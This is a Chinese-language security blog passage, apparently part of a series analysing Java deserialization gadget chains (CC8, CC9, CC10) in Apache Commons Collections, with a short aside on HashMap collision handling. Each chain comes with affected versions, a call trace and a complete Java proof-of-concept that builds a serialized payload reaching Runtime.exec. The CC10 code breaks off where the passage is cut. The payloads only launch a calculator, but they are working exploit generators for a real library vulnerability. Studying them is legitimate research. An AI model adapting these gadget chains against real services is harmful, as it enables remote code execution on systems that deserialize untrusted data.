src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20221005230840200.png"></p><p>前面提到过，<code>LazyMap</code>的<code>map</code>属性为<code>HashMap</code>对象时，其新增的元素是存储在<code>HashMap.Node</code>内部类中的，而我们向<code>LazyMap</code>put 了一组 hash 冲突的键(这个两个键然后存储在<code>HashMap.Node</code>)，这就涉及到了<code>HashMap</code>如何处理 hash 冲突的了</p><p>我们看一下<code>LazyMap.put-&gt;HashMap.put</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (table == EMPTY_TABLE) &#123;<br>        inflateTable(threshold);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> putForNullKey(value);<br>    <span class="hljs-keyword">int</span> hash = hash(key);<br>    <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);<br>    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) &#123;<br>        Object k;<br>        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<br>            V oldValue = e.value;<br>            e.value = value;<br>            e.recordAccess(<span class="hljs-keyword">this</span>);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br><br>    modCount++;<br>    addEntry(hash, key, value, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addEntry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> hash, K key, V value, <span class="hljs-keyword">int</span> bucketIndex)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="hljs-keyword">null</span> != table[bucketIndex])) &#123;<br>        resize(<span class="hljs-number">2</span> * table.length);<br>        hash = (<span class="hljs-keyword">null</span> != key) ? hash(key) : <span class="hljs-number">0</span>;<br>        bucketIndex = indexFor(hash, table.length);<br>    &#125;<br><br>    createEntry(hash, key, value, bucketIndex);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可知是通过单向链表解决的</p><blockquote><p><a href="https://blog.csdn.net/weixin_72753070/article/details/126120740">https://blog.csdn.net/weixin_72753070/article/details/126120740</a></p><p>版本应该不一样，了解即可</p><p>系统总是将新添加的 Entry 对象放入 table 数组的 bucketIndex 索引处——如果 bucketIndex 索引处已经有了一个 Entry 对象，那新添加的 Entry 对象指向原有的 Entry 对象（产生一个 Entry 链），如果 bucketIndex 索引处没有 Entry 对象，也就是上面程序代码的 e 变量是 null，也就是新放入的 Entry 对象指向 null，也就是没有产生 Entry 链</p><p>HashMap 里面没有出现 hash 冲突时，没有形成单链表时，hashmap 查找元素很快,get()方法能够直接定位到元素，但是出现单链表后，单个 bucket 里存储的不是一个 Entry，而是一个 Entry 链，系统只能必须按顺序遍历每个 Entry，直到找到想搜索的 Entry 为止——如果恰好要搜索的 Entry 位于该 Entry 链的最末端（该 Entry 是最早放入该 bucket 中），那系统必须循环到最后才能找到该元素</p><p>当创建 HashMap 时，有一个默认的负载因子（load factor），其默认值为 0.75，这是时间和空间成本上一种折衷：增大负载因子可以减少 Hash 表（就是那个 Entry 数组）所占用的内存空间，但会增加查询数据的时间开销，而查询是最频繁的的操作（HashMap 的 get() 与 put() 方法都要用到查询）；减小负载因子会提高数据查询的性能，但会增加 Hash 表所占用的内存空间</p></blockquote><p><a href="https://www.anquanke.com/post/id/190468">https://www.anquanke.com/post/id/190468</a></p><p><a href="https://www.anquanke.com/post/id/190472">https://www.anquanke.com/post/id/190472</a></p><p><a href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p><h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><h3 id="Pre-7"><a href="#Pre-7" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-7"><a href="#限制-7" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 4.0</p></blockquote><h4 id="利用链-7"><a href="#利用链-7" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.TreeBag</span><span class="hljs-selector-class">.readObject</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.AbstractMapBag</span><span class="hljs-selector-class">.doReadObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.put</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><span class="hljs-selector-class">.TransformingComparator</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-class">.newTransformer</span><br>    ... (TemplatesImpl gadget)<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure><h4 id="关键类-7"><a href="#关键类-7" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TreeBag</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">TransformingComparator</span><br><span class="hljs-attribute">InvokerTransformer</span><br></code></pre></td></tr></table></figure><p>与 CC2、CC4 的区别在于使用了新的触发点 TreeBag</p><h3 id="Gadget-7"><a href="#Gadget-7" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC8;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.bag.TreeBag;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(invokerTransformer);<br>        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);<br>        treeBag.add(templatesimpl);<br>        setFieldValue(invokerTransformer,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(treeBag);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><h3 id="Pre-8"><a href="#Pre-8" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-8"><a href="#限制-8" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1-3.2.1</p></blockquote><h4 id="利用链-8"><a href="#利用链-8" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span> <span class="hljs-comment">//??BadAttributeValueExpException</span><br><span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-comment">//?? BadAttributeValueExpException</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DefaultedMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure><h4 id="关键类-8"><a href="#关键类-8" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DefaultedMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br></code></pre></td></tr></table></figure><p>梅子酒师傅提交的 CommonsCollections9，主要利用的是 CommonsCollections:3.2 版本新增的 DefaultedMap 来代替 LazyMap，因为这两个 Map 有同样的 get 函数可以被利用</p><h3 id="Gadget-8"><a href="#Gadget-8" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC9;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC9</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = DefaultedMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(fakechainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections10"><a href="#CommonsCollections10" class="headerlink" title="CommonsCollections10"></a>CommonsCollections10</h2><h3 id="Pre-9"><a href="#Pre-9" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-9"><a href="#限制-9" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-9"><a href="#利用链-9" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Hashtable.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Hashtable.reconstitutionPut<br>    -&gt; key.hashCode<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">TiedMapEntry</span>.<span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> TiedMapEntry.getValue<br>    -&gt; TiedMapEntry.<span class="hljs-keyword">map</span>.get<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">LazyMap</span>.<span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> factory.transform<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">ChainedTransformer</span>.<span class="hljs-title">transform</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure><h4 id="关键类-9"><a href="#关键类-9" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">Hashtable</span><br></code></pre></td></tr></table></figure><h3 id="Gadget-9"><a href="#Gadget-9" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC10;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC10</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, 